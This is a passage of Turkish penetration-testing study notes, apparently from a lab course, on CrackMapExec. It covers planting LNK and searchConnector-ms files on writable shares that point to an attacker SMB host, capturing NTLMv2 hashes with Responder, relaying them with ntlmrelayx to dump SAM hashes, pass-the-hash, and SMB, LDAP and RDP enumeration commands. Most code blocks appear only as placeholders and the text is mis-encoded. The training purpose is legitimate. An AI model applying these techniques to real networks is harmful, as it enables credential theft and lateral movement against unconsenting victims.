Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

